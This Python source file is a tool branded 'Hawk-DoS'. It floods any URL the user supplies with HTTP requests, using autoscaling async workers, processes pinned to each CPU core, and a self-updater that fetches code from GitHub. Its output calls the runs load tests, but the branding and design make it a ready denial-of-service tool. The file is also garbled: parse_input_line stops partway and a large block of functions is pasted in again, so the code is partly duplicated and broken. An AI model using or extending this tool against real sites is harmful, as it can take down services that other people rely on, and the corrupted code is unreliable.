import asyncio
import itertools
import multiprocessing as mp
import os
import re
import shlex
import socket
import sys
import threading
import time

import aiohttp

try:
    import uvloop
except ImportError:
    uvloop = None

try:
    import resource
except ImportError:
    resource = None

RED = "\033[1;31m"
RESET = "\033[0m"
PROMPT = f"{RED}Hawk-DoS>> {RESET}"

VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/your-user/hawk-dos/main/dos_tool.py"

TARGET_RPS = 1000
MAX_SLOTS = 256
MAX_TOTAL_CONN = 20000
MAX_WORKERS_PER_SLOT = 4000

BANNER = r"""
      :::::::::  :::::::::  :::::::::
     :+:    :+: :+:    :+: :+:    :+:
    +:+    +:+ +:+    +:+ +:+
   +#+    +:+ +#+    +#+ +#++:++#++
  +#+    +#+ +#+    +#+        +#+
 #+#    #+# #+#    #+# #+#    #+#
#########   ########   ########      """

HELP_TEXT = """================================================================================
HAWK-DOS :: COMMAND REFERENCE & USAGE MANUAL
================================================================================
USAGE:
  dos -u <url> [-c <concurrency>] [-p <requests>] [-r <rps>] [-N] [-HawkX]
      [-sL /cpu-<N> + /thread-<M>]
  (Note: Commands MUST start with 'dos' at the beginning of the line.)

GENERAL FORMATTING RULES:
  - Always start the command with 'dos'
    (example: dos -u http://127.0.0.1:8080 -c 300 -p 50000).
  - Separate every flag and value with a single space.
  - Do NOT put commas in numbers (write 50000, NEVER 50,000).
  - Do NOT attach values directly to flags (write -c 300, NEVER -c300).
  - Flags can be placed in any order after -u <url>.

--------------------------------------------------------------------------------
FUNCTION & OPTION DETAILS
--------------------------------------------------------------------------------
  -u <url>
      Target Endpoint Specification.
      How to use: Type -u followed by a space and the target HTTP/HTTPS URL
                  (example: dos -u http://192.168.1.145:8080).
      Formatting: Include http:// or https:// and a valid host/port. No commas
                  or extra spaces inside the URL. Required to start a run.

  -c <concurrency>
      Worker Concurrency Level (per slot).
      How to use: Type -c followed by a space and a plain whole number
                  (example: dos -u http://127.0.0.1:8080 -c 300).
      Formatting: Plain digits only, NO commas (use 1000, not 1,000).
                  Sets the STARTING async task count and live connection pool
                  size per slot. The autoscaler adds more tasks above this if
                  the target rate has not been reached. Default: 300.

  -p <count>
      Request Limit / Stop Threshold.
      How to use: Type -p followed by a space and a plain whole number for how
                  many total requests to send until the test ends
                  (example: dos -u http://127.0.0.1:8080 -p 50000).
      Formatting: Plain digits only, NO commas (use 100000, not 100,000).
                  Also accepts -n / --requests. Default: 50000.

  -r <rps>
      Target Rate (packets per second).
      How to use: Type -r followed by a space and a plain whole number
                  (example: dos -u http://127.0.0.1:8080 -r 1000).
      Formatting: Plain digits only, NO commas. The autoscaler grows task
                  count until this rate is reached, then holds. Default: 1000.

  -N
      Non-Burst / Steady-Flow Mode.
      How to use: Type -N as a standalone flag with NO number after it
                  (example: dos -u http://127.0.0.1:8080 -c 300 -p 50000 -N).
      Formatting: No value argument. Ramps tasks in over ~1 second, applies a
                  token-bucket soft cap so packets leave evenly instead of in
                  waves, and switches the display to a smoothed single-line
                  moving-average refresh so the numbers stop jittering.

  -HawkX
      Full Hardware Utilization Mode.
      How to use: Type -HawkX as a standalone flag with NO number after it
                  (example: dos -u http://127.0.0.1:8080 -HawkX).
      Formatting: No value argument. Detects every real CPU core and spawns one
                  pinned worker process per core, each fanning out one pinned
                  thread per core as well.

  -sL /cpu-<N> + /thread-<M>
      Selective CPU & Thread Allocation.
      How to use: Type -sL followed by /cpu-<N> + /thread-<M>
                  (example: dos -u http://127.0.0.1:8080 -sL /cpu-4 + /thread-2).
      Formatting: Plain digits only after /cpu- and /thread-, NO commas
                  (e.g. /cpu-4 + /thread-2, NEVER /cpu-4,8 or two bare numbers).
                  /cpu-<N> spawns N worker processes pinned to real distinct
                  cores. /thread-<M> spawns M real OS threads inside each of
                  those processes, each pinned to that core, each with its own
                  event loop and connection pool. Total slots = cpu x thread.
                  Both values are capped to your real core count.

  help
      Documentation Output.
      How to use: Type help (or dos help) at the Hawk-DoS>> prompt to display
                  this manual.

  upd
      Self-Update.
      How to use: Type upd (or dos upd) at the Hawk-DoS>> prompt.
      Formatting: No value argument. Fetches the latest build from UPDATE_URL,
                  compares its version against the running one, and replaces
                  this script (old copy kept as .bak) if a newer build exists.
================================================================================"""


def rprint(*args, sep=" ", end="\n"):
    "print(), but everything comes out bold red."
    print(RED + sep.join(str(a) for a in args) + RESET, end=end)


def detect_real_cpu_cores() -> int:
    try:
        return len(os.sched_getaffinity(0))
    except Exception:
        return os.cpu_count() or 1


def raise_fd_limit():
    """Lift the soft fd limit to the hard limit; one fd per live connection."""
    if resource is None:
        return
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = hard if hard != resource.RLIM_INFINITY else (1 << 20)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
    except Exception:
        pass


def pin_current_thread(cores):
    """Pin the CALLING thread. sched_setaffinity(0) is per-thread on Linux."""
    if hasattr(os, "sched_setaffinity") and cores:
        try:
            os.sched_setaffinity(0, set(cores))
        except Exception:
            pass


def _ver_tuple(v):
    return tuple(int(p) for p in re.findall(r"\d+", v)) or (0,)


def _script_path():
    try:
        return os.path.abspath(__file__)
    except NameError:
        return os.path.abspath(sys.argv[0])


def _fetch_latest_build():
    import urllib.request

    req = urllib.request.Request(UPDATE_URL, headers={"User-Agent": f"Hawk-DoS/{VERSION}"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("utf-8", "replace")


def run_update():
    """Fetch the remote build, compare versions, and replace this script if newer."""
    import shutil

    rprint(f"[+] Running version: {VERSION}")
    rprint(f"[+] Source: {UPDATE_URL}")

    try:
        latest = _fetch_latest_build()
    except Exception as exc:
        rprint(f"[!] Update check failed: {exc}")
        return

    remote = re.search(r'^VERSION\s*=\s*"([^"]+)"', latest, re.M)
    if not remote:
        rprint("[!] Remote build has no VERSION marker; aborting.")
        return
    remote_version = remote.group(1)

    if _ver_tuple(remote_version) <= _ver_tuple(VERSION):
        rprint(f"[+] Already up to date (remote: {remote_version}).")
        return

    path = _script_path()
    tmp = path + ".new"
    try:
        shutil.copy2(path, path + ".bak")
        with open(tmp, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(latest)
        os.chmod(tmp, os.stat(path).st_mode)
        os.replace(tmp, path)
    except Exception as exc:
        rprint(f"[!] Update failed: {exc}")
        return

    rprint(f"[+] Updated {VERSION} -> {remote_version}.")
    rprint(f"[+] Backup kept at: {path}.bak")
    rprint("[+] Restart Hawk-DoS to apply.")


def _extract_host_family(addr):
    if isinstance(addr, dict):
        fam = addr.get("family")
        if fam in (socket.AF_INET, socket.AF_INET6):
            return fam
        host = str(addr.get("host") or "")
    elif isinstance(addr, (tuple, list)) and addr:
        host = str(addr[0] or "")
    else:
        host = ""
    return socket.AF_INET6 if ":" in host else socket.AF_INET


def _socket_factory(addr, *args, **kwargs):
    family = _extract_host_family(addr)
    sock = socket.socket(family=family, type=socket.SOCK_STREAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        pass
    sock.setblocking(False)
    return sock


class Pacer:
    """Token bucket used only by -N. Smooths emission without starving."""

    __slots__ = ("_rate", "_cap", "_tokens", "_last", "_lock")

    def __init__(self, rate, capacity):
        self._rate = max(1.0, float(rate))
        self._cap = max(1.0, float(capacity))
        self._tokens = self._cap
        self._last = time.perf_counter()
        self._lock = asyncio.Lock()

    async def wait(self):
        async with self._lock:
            now = time.perf_counter()
            self._tokens = min(self._cap, self._tokens + (now - self._last) * self._rate)
            self._last = now
            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return
            deficit = (1.0 - self._tokens) / self._rate
            self._tokens = 0.0
        await asyncio.sleep(deficit)


async def worker(session, target_url, counter, total, stats, state, stop_event, pacer):
    """Counter-driven worker: no queue, no locks, can be added mid-run."""
    state["live"] += 1
    try:
        while not stop_event.is_set():
            if next(counter) >= total:
                stop_event.set()
                return
            if pacer is not None:
                await pacer.wait()
            try:
                async with session.get(target_url) as response:
                    await response.read()
                    if response.status < 400:
                        stats["success"] += 1
                        stats["this_second_success"] += 1
                    else:
                        stats["failed"] += 1
                        stats["this_second_failed"] += 1
            except Exception:
                stats["failed"] += 1
                stats["this_second_failed"] += 1
    finally:
        state["live"] -= 1


async def live_monitor(stats, stop_event, target_url, smooth):
    """Live stats. smooth=True -> single-line EWMA refresh for -N."""
    alpha = 0.35
    ewma = 0.0
    ewma_f = 0.0
    interval = 0.5 if smooth else 1.0

    while not stop_event.is_set():
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=interval)
            break
        except asyncio.TimeoutError:
            pass

        succ = stats["this_second_success"]
        fail = stats["this_second_failed"]
        rate = succ / interval
        stats["last_rate"] = rate
        if rate > stats["peak"]:
            stats["peak"] = rate

        stats["this_second_success"] = 0
        stats["this_second_failed"] = 0

        ewma = ewma * (1 - alpha) + rate * alpha
        ewma_f = ewma_f * (1 - alpha) + (fail / interval) * alpha

        if smooth:
            line = (
                f"[+] {time.strftime('%H:%M:%S')} | {target_url} | "
                f"{ewma:7.0f} req/s avg | fail {ewma_f:5.0f}/s | "
                f"OK {stats['success']} | FAIL {stats['failed']} | tasks {stats['live']}"
            )
            sys.stdout.write("\r" + RED + line.ljust(125)[:125] + RESET)
            sys.stdout.flush()
        else:
            rprint(
                f"[+] TIME: {time.strftime('%H:%M:%S')} | [+] URL: {target_url} | "
                f"Success/sec: {succ} | Failed/sec: {fail} | Total OK: {stats['success']}"
            )

    if smooth:
        sys.stdout.write("\n")
        sys.stdout.flush()


async def autoscaler(stats, state, stop_event, spawn, target_rps, cap, total_requests):
    """Grow the task count until target rate is met, then hold instead of
    blindly maxing out to `cap` regardless of actual measured rate."""
    idle = 0
    while not stop_event.is_set():
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=0.5)
            break
        except asyncio.TimeoutError:
            pass

        if stop_event.is_set() or (stats["success"] + stats["failed"]) >= total_requests:
            break

        rate = stats["last_rate"]
        live = state["live"]
        if live >= cap:
            continue

        if rate < target_rps * 0.95:
            idle = 0
            add = min(max(10, live // 2), cap - live)
            if add > 0:
                spawn(add)
        else:
            idle += 1
            if idle >= 3 and rate > target_rps * 2.0:
                return


def _new_connector(limit):
    kwargs = dict(
        limit=limit,
        limit_per_host=limit,
        keepalive_timeout=120,
        ttl_dns_cache=600,
        enable_cleanup_closed=True,
        force_close=False,
    )
    try:
        return aiohttp.TCPConnector(socket_factory=_socket_factory, **kwargs)
    except Exception:
        return aiohttp.TCPConnector(**kwargs)
async def _run_async_pool(target_url, concurrency, total_requests, non_burst=False, target_rps=TARGET_RPS):
    concurrency = max(1, concurrency)
    stats = {
        "success": 0,
        "failed": 0,
        "this_second_success": 0,
        "this_second_failed": 0,
        "last_rate": 0.0,
        "peak": 0.0,
        "live": 0,
    }
    state = {"live": 0}
    stop_event = asyncio.Event()
    counter = itertools.count()

    timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
    pacer = Pacer(rate=target_rps * 2.0, capacity=max(1, target_rps // 20)) if non_burst else None
    pool_limit = min(MAX_WORKERS_PER_SLOT, max(concurrency * 2, 256))
    connector = _new_connector(pool_limit)
    tasks = []

    async with aiohttp.ClientSession(
        connector=connector,
        auto_decompress=False,
        headers={"Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
        timeout=timeout,
    ) as session:
        def spawn(n):
            if stop_event.is_set():
                return
            for _ in range(n):
                tasks.append(
                    asyncio.create_task(
                        worker(session, target_url, counter, total_requests, stats, state,
                               stop_event, pacer)
                    )
                )

        monitor = asyncio.create_task(live_monitor(stats, stop_event, target_url, smooth=non_burst))
        scaler = asyncio.create_task(
            autoscaler(stats, state, stop_event, spawn, target_rps, pool_limit, total_requests)
        )

        ramp = min(0.02, 1.0 / concurrency) if non_burst else 0.0
        for _ in range(concurrency):
            if stop_event.is_set():
                break
            spawn(1)
            if ramp:
                await asyncio.sleep(ramp)

        while True:
            pending = [t for t in tasks if not t.done()]
            if not pending:
                break
            await asyncio.gather(*pending, return_exceptions=True)
            tasks = [t for t in tasks if not t.done()]

        stop_event.set()
        scaler.cancel()
        try:
            await scaler
        except asyncio.CancelledError:
            pass
        await monitor

    stats.pop("live", None)
    return stats


def _thread_slot(target_url, concurrency, total_requests, core_id, non_burst, target_rps):
    """One real OS thread: own event loop, own pool, pinned to its core."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        pin_current_thread([core_id])
        return loop.run_until_complete(
            _run_async_pool(target_url, concurrency, total_requests, non_burst, target_rps)
        )
    finally:
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
        except Exception:
            pass
        loop.close()


def _process_entry(target_url, concurrency, chunk, core_id, threads, non_burst=False, target_rps=TARGET_RPS):
    """One worker process: pinned to core_id, fans out real threads on that core."""
    pin_current_thread([core_id])
    raise_fd_limit()

    results = [None] * len(chunk)

    def run(idx, reqs):
        results[idx] = _thread_slot(target_url, concurrency, reqs, core_id, non_burst, target_rps)

    threads_list = []
    for idx, reqs in enumerate(chunk):
        if reqs <= 0:
            continue
        t = threading.Thread(target=run, args=(idx, reqs), daemon=True)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

    merged = {"success": 0, "failed": 0, "peak": 0.0}
    for part in results:
        if part:
            merged["success"] += part["success"]
            merged["failed"] += part["failed"]
            merged["peak"] = max(merged["peak"], part["peak"])
    return merged


def _parse_sl_spec(tokens, start_idx, real_cores):
    """Parses -sL /cpu-<N> + /thread-<M>. Returns (cores, threads, next_index)."""
    collected = []
    j = start_idx
    while j < len(tokens):
        t = tokens[j]
        if t.startswith("-") and not t.startswith("/cpu-") and not t.startswith("/thread-"):
            break
        if t == "+":
            j += 1
            continue
        collected.append(t)
        j += 1

    joined = " ".join(collected)
    cpu_match = re.search(r"/cpu-(\d+)", joined)
    thread_match = re.search(r"/thread-(\d+)", joined)

    cores = max(1, min(int(cpu_match.group(1)), real_cores)) if cpu_match else 1
    threads = max(1, min(int(thread_match.group(1)), real_cores)) if thread_match else 1
    return cores, threads, j


def parse_input_line(line: str, real_cores: int):
    try:
        tokens = shlex.split(line)
    except ValueError:
        tokens = line.split()

    if not tokens:
        return None

    if tokens[0].lower() in ("help", "-h", "--help", "-help", "?"):
        return ("HELP", None)
    if tokens[0].lower() in ("upd", "update"):
        return ("UPD", None)
    if tokens[0].lower() in ("exit", "quit"):
        return ("EXIT", None)
    if tokens[0] != "dos":
        return None

    tokens = tokens[1:]
    if not tokens:
        return None
    if tokens[0].lower() in ("help", "-h", "--help", "-help", "?"):
        return ("HELP", None)
    if tokens[0].lower() in ("upd", "update"):
        return ("UPD", None)
    if tokens[0].lower() in ("exit", "quit"):
        return ("EXIT", None)

    target_url = None
    concurrency = 300
    total_requests = 50000
    cores_to_use = 1
    threads_to_use = 1
    non_burst = False
    target_rps = TARGET_RPS

    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in ("-u", "--url") and i + 1 < len(tokens):
            target_url = tokens[i + 1]
            i += 2
            continue
        if tok in ("-c", "--concurrency") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                concurrency = max(1, int(tokens[i + 1]))
            i += 2
            continue
        if tok in ("-p", "-n", "--requests") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                total_requests = int(tokens[i + 1])
            i += 2
            continue
        if tok in ("-r", "--rps") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                target_rps = max(1, int(tokens[i + 1]))
async def _run_async_pool(target_url, concurrency, total_requests, non_burst=False, target_rps=TARGET_RPS):
    concurrency = max(1, concurrency)
    stats = {
        "success": 0,
        "failed": 0,
        "this_second_success": 0,
        "this_second_failed": 0,
        "last_rate": 0.0,
        "peak": 0.0,
        "live": 0,
    }
    state = {"live": 0}
    stop_event = asyncio.Event()
    counter = itertools.count()

    timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
    pacer = Pacer(rate=target_rps * 2.0, capacity=max(1, target_rps // 20)) if non_burst else None
    pool_limit = min(MAX_WORKERS_PER_SLOT, max(concurrency * 2, 256))
    connector = _new_connector(pool_limit)
    tasks = []

    async with aiohttp.ClientSession(
        connector=connector,
        auto_decompress=False,
        headers={"Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
        timeout=timeout,
    ) as session:
        def spawn(n):
            if stop_event.is_set():
                return
            for _ in range(n):
                tasks.append(
                    asyncio.create_task(
                        worker(session, target_url, counter, total_requests, stats, state,
                               stop_event, pacer)
                    )
                )

        monitor = asyncio.create_task(live_monitor(stats, stop_event, target_url, smooth=non_burst))
        scaler = asyncio.create_task(
            autoscaler(stats, state, stop_event, spawn, target_rps, pool_limit, total_requests)
        )

        ramp = min(0.02, 1.0 / concurrency) if non_burst else 0.0
        for _ in range(concurrency):
            if stop_event.is_set():
                break
            spawn(1)
            if ramp:
                await asyncio.sleep(ramp)

        while True:
            pending = [t for t in tasks if not t.done()]
            if not pending:
                break
            await asyncio.gather(*pending, return_exceptions=True)
            tasks = [t for t in tasks if not t.done()]

        stop_event.set()
        scaler.cancel()
        try:
            await scaler
        except asyncio.CancelledError:
            pass
        await monitor

    stats.pop("live", None)
    return stats


def _thread_slot(target_url, concurrency, total_requests, core_id, non_burst, target_rps):
    """One real OS thread: own event loop, own pool, pinned to its core."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        pin_current_thread([core_id])
        return loop.run_until_complete(
            _run_async_pool(target_url, concurrency, total_requests, non_burst, target_rps)
        )
    finally:
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
        except Exception:
            pass
        loop.close()


def _process_entry(target_url, concurrency, chunk, core_id, threads, non_burst=False, target_rps=TARGET_RPS):
    """One worker process: pinned to core_id, fans out real threads on that core."""
    pin_current_thread([core_id])
    raise_fd_limit()

    results = [None] * len(chunk)

    def run(idx, reqs):
        results[idx] = _thread_slot(target_url, concurrency, reqs, core_id, non_burst, target_rps)

    threads_list = []
    for idx, reqs in enumerate(chunk):
        if reqs <= 0:
            continue
        t = threading.Thread(target=run, args=(idx, reqs), daemon=True)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

    merged = {"success": 0, "failed": 0, "peak": 0.0}
    for part in results:
        if part:
            merged["success"] += part["success"]
            merged["failed"] += part["failed"]
            merged["peak"] = max(merged["peak"], part["peak"])
    return merged


def _parse_sl_spec(tokens, start_idx, real_cores):
    """Parses -sL /cpu-<N> + /thread-<M>. Returns (cores, threads, next_index)."""
    collected = []
    j = start_idx
    while j < len(tokens):
        t = tokens[j]
        if t.startswith("-") and not t.startswith("/cpu-") and not t.startswith("/thread-"):
            break
        if t == "+":
            j += 1
            continue
        collected.append(t)
        j += 1

    joined = " ".join(collected)
    cpu_match = re.search(r"/cpu-(\d+)", joined)
    thread_match = re.search(r"/thread-(\d+)", joined)

    cores = max(1, min(int(cpu_match.group(1)), real_cores)) if cpu_match else 1
    threads = max(1, min(int(thread_match.group(1)), real_cores)) if thread_match else 1
    return cores, threads, j


def parse_input_line(line: str, real_cores: int):
    try:
        tokens = shlex.split(line)
    except ValueError:
        tokens = line.split()

    if not tokens:
        return None

    if tokens[0].lower() in ("help", "-h", "--help", "-help", "?"):
        return ("HELP", None)
    if tokens[0].lower() in ("upd", "update"):
        return ("UPD", None)
    if tokens[0].lower() in ("exit", "quit"):
        return ("EXIT", None)
    if tokens[0] != "dos":
        return None

    tokens = tokens[1:]
    if not tokens:
        return None
    if tokens[0].lower() in ("help", "-h", "--help", "-help", "?"):
        return ("HELP", None)
    if tokens[0].lower() in ("upd", "update"):
        return ("UPD", None)
    if tokens[0].lower() in ("exit", "quit"):
        return ("EXIT", None)

    target_url = None
    concurrency = 300
    total_requests = 50000
    cores_to_use = 1
    threads_to_use = 1
    non_burst = False
    target_rps = TARGET_RPS

    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in ("-u", "--url") and i + 1 < len(tokens):
            target_url = tokens[i + 1]
            i += 2
            continue
        if tok in ("-c", "--concurrency") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                concurrency = max(1, int(tokens[i + 1]))
            i += 2
            continue
        if tok in ("-p", "-n", "--requests") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                total_requests = int(tokens[i + 1])
            i += 2
            continue
        if tok in ("-r", "--rps") and i + 1 < len(tokens):
            if tokens[i + 1].isdigit():
                target_rps = max(1, int(tokens[i + 1]))
            i += 2
            continue
        if tok == "-N":
            non_burst = True
            i += 1
            continue
        if tok == "-HawkX":
            cores_to_use = real_cores
            threads_to_use = real_cores
            i += 1
            continue
        if tok == "-sL":
            cores_to_use, threads_to_use, i = _parse_sl_spec(tokens, i + 1, real_cores)
            continue
        if target_url is None and not tok.startswith("-") and not tok.startswith("/"):
            target_url = tok
        i += 1

    if not target_url:
        return None

    return (
        "RUN",
        (target_url, concurrency, total_requests, cores_to_use, threads_to_use, non_burst, target_rps),
    )


def _merge(dst, src):
    dst["success"] += src.get("success", 0)
    dst["failed"] += src.get("failed", 0)
    dst["peak"] = max(dst["peak"], src.get("peak", 0.0))


def run_benchmark(target_url, concurrency, total_requests, cores_to_use, threads_to_use,
                  non_burst=False, target_rps=TARGET_RPS):
    cores_to_use = max(1, cores_to_use)
    threads_to_use = max(1, threads_to_use)
    slots = cores_to_use * threads_to_use

    if slots > MAX_SLOTS:
        cores_to_use = max(1, MAX_SLOTS // threads_to_use)
        slots = cores_to_use * threads_to_use
        rprint(f"[!] Slot cap hit -> reduced to {cores_to_use} core(s) x {threads_to_use} thread(s).")

    if concurrency * slots > MAX_TOTAL_CONN:
        concurrency = max(1, MAX_TOTAL_CONN // slots)
        rprint(f"[!] Connection cap hit -> starting concurrency trimmed to {concurrency} per slot.")

    raise_fd_limit()

    rprint("\n[+] Starting Load Test...")
    rprint(f"[+] URL: {target_url}")
    rprint(
        f"[+] Strength (Concurrency): {concurrency} start workers/slot x {slots} slot(s)"
        f" | Target Volume: {total_requests} requests | Target Rate: {target_rps} req/s"
        f" | CPU: {cores_to_use} | Threads: {threads_to_use}"
        f"{' | Mode: Non-Burst (-N)' if non_burst else ''}\n"
    )

    start_time = time.perf_counter()
    stats = {"success": 0, "failed": 0, "peak": 0.0}
    interrupted = False

    base, rem = divmod(total_requests, slots)
    per_slot = [base + (1 if idx < rem else 0) for idx in range(slots)]
    chunks = [per_slot[i * threads_to_use:(i + 1) * threads_to_use] for i in range(cores_to_use)]

    try:
        if slots == 1:
            _merge(stats, _process_entry(target_url, concurrency, chunks[0], 0,
                                         threads_to_use, non_burst, target_rps))
        else:
            ctx = mp.get_context("fork" if "fork" in mp.get_all_start_methods() else "spawn")
            pool = ctx.Pool(processes=cores_to_use)
            try:
                jobs = [
                    pool.apply_async(
                        _process_entry,
                        (target_url, concurrency, chunks[idx], idx, threads_to_use,
                         non_burst, target_rps),
                    )
                    for idx in range(cores_to_use)
                ]
                for job in jobs:
                    _merge(stats, job.get())
            except KeyboardInterrupt:
                interrupted = True
                pool.terminate()
            finally:
                pool.close()
                pool.join()
    except KeyboardInterrupt:
        interrupted = True

    elapsed = max(time.perf_counter() - start_time, 1e-9)
    total_sent = stats["success"] + stats["failed"]
    rps = total_sent / elapsed if elapsed > 0 else 0
    ok_rate = (stats["success"] / total_sent * 100) if total_sent else 0.0
    met = "MET" if rps >= target_rps else "NOT MET"

    rprint("\n================ BENCHMARK FINISHED ================")
    rprint(f"[+] TIME: {time.strftime('%H:%M:%S')}")
    rprint(f"Total Requests Completed: {total_sent}")
    rprint(f"Time Taken:               {elapsed:.2f} seconds")
    rprint(f"Requests Per Second:      {rps:.2f} RPS  (peak {stats['peak']:.2f})")
    rprint(f"Target Rate:              {target_rps} RPS -> {met}")
    rprint(f"Successful (HTTP 2xx/3xx):{stats['success']}")
    rprint(f"Failed / Connection Errs: {stats['failed']}")
    rprint(f"Success Rate:             {ok_rate:.2f}%")
    rprint(f"Allocation Used:          {cores_to_use} proc x {threads_to_use} thread = {slots} slot(s)")
    if interrupted:
        rprint("[!] Run aborted by user.")


def main():
    if uvloop is not None:
        try:
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        except Exception:
            pass

    raise_fd_limit()
    real_cores = detect_real_cpu_cores()
   # ASCII Art Banner
    rprint(BANNER)
    rprint("Enter 'help' for directions")

    if len(sys.argv) > 1:
        raw_argv = " ".join(shlex.quote(a) for a in sys.argv[1:])
        if not raw_argv.startswith("dos "):
            raw_argv = "dos " + raw_argv
        parsed = parse_input_line(raw_argv, real_cores)
        if parsed is not None:
            kind, payload = parsed
            if kind == "HELP":
                rprint(HELP_TEXT)
                return
            if kind == "UPD":
                run_update()
                return
            if kind == "EXIT":
                sys.exit(0)
            if kind == "RUN":
                run_benchmark(*payload)
                return

    while True:
        try:
            line = input(PROMPT)
        except EOFError:
            break

        parsed = parse_input_line(line, real_cores)
        if parsed is None:
            continue

        kind, payload = parsed
        if kind == "HELP":
            rprint(HELP_TEXT)
        elif kind == "UPD":
            run_update()
        elif kind == "EXIT":
            sys.exit(0)
        elif kind == "RUN":
            run_benchmark(*payload)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        rprint("\n[!] Test aborted by user.")
        sys.exit(0)
